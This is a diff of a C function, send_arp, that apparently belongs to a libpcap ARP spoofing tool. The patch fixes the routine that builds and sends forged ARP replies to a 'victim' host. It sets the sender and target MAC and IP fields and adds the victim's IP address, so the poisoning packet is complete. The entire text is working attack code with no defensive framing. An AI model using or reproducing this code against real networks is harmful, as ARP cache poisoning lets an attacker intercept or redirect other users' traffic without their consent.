@@ -17,6 +17,8 @@ void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
 
 	if(flag == 1)
 	{	
+		memset(packet, 0, packet_size);		//initiallize the packet memory with 0's
+
 		for (int i = 0; i < 6; i++)
 		{
 			eth_hdr -> ether_dhost[i] = 0xff;	//For broadcasting
@@ -24,7 +26,7 @@ void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
 		}
 	
 		eth_hdr -> ether_type = htons(ETHERTYPE_ARP);	//ARP protocol, ETHERTYPE_ARP = 0x0806
-		memcpy(packet, (u_char *)eth_hdr, LIBNET_ETH_H);		//ethernet header
+		memcpy(packet, (u_char *)eth_hdr, LIBNET_ETH_H);	//ethernet header
 
 		arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);	//ARPHRD_ETHER = 1
 		arp_hdr -> ar_pro = htons(ETHERTYPE_IP);	//0x0800 (IPv4)
@@ -40,13 +42,21 @@ void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
 
 		pcap_sendpacket(handle, packet, packet_size);	//Send ARP request packet
 	}
+
 	else if (flag == 2)
 	{
 		//Change the ethernet destination host from broadcast to victim's mac address
 		for(int i = 0; i < 6; i++)
+		{
 			eth_hdr -> ether_dhost[i] = d_mac[i];	
+			eth_hdr -> ether_shost[i] = s_mac[i];
+		}
 
 		//Change the operation from request to reply
+		arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);	//ARPHRD_ETHER = 1
+		arp_hdr -> ar_pro = htons(ETHERTYPE_IP);	//0x0800 (IPv4)
+		arp_hdr -> ar_hln = 0x06;			//header size
+		arp_hdr -> ar_pln = 0x04;			//protocol size
 		arp_hdr -> ar_op = htons(ARPOP_REPLY);		
 		
 		memcpy(packet, (u_char *)eth_hdr, LIBNET_ETH_H); 
@@ -54,7 +64,11 @@ void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
 		memcpy(packet + 22, s_mac, ETHER_ADDR_LEN);
 		memcpy(packet + 28, &s_ip.s_addr, 4);
 		memcpy(packet + 32, d_mac, ETHER_ADDR_LEN);
+		memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address
 
 		pcap_sendpacket(handle, packet, packet_size);
 	}
+
+	free(eth_hdr);
+	free(arp_hdr);
 }
